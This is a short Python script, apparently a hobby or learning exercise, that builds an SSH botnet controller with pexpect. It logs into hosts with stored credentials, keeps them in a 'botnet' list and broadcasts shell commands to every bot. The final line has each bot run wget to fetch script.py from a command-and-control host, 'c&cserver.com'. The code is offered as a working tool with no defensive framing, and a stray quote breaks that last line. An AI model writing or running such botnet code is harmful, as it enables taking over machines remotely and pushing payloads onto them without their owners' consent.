from pexpect import pxssh

class Bot:

    """Initi new clients on our bot network"""
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session =self.ssh()

    """Secure shell into client"""
    def ssh(self):
        try:
            bot = pxssh.pxssh()
            bot.login(self.host, self.user, self.password)
            return bot
        except Exception as e:
            print('Connection Faliure')
            print(e)

    """send command to client"""
    def command_control(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

    """send a command to all bots in the botnet"""
    @staticmethod
    def command_bots(command):
        for bot in botnet:
            attack = bot.command_control(command)
            print('Output from ' + bot.host)
            print(attack)

botnet = []

def add_bot(host, user, password):
    new_bot = Bot(host, user, password)
    botnet.append(new_bot)

add_bot('10.10.0.1', '', '')

Bot.command_bots('ls')

Bot.command_bots("""wget  -O /Users/Owner/Desktop/ "http://c&cserver.com/script.py"""")